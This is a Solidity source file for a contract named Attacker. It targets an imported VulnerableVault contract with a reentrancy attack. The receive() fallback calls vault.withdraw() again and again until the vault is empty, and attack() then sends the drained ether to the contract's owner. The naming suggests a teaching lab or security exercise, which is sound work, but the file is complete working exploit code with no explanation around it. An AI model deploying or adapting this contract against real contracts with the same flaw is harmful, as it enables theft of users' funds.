// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "./VulnerableVault.sol";

contract Attacker {
    VulnerableVault public vault;
    address public owner;
    bool public attacking;

    constructor(VulnerableVault _vault) {
        vault = _vault;
        owner = msg.sender;
    }

    // Seed initial balance
    function depositToVault() external payable {
        vault.deposit{value: msg.value}();
    }

    function attack() external {
        attacking = true;
        vault.withdraw();
        attacking = false;
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        if (attacking && address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}
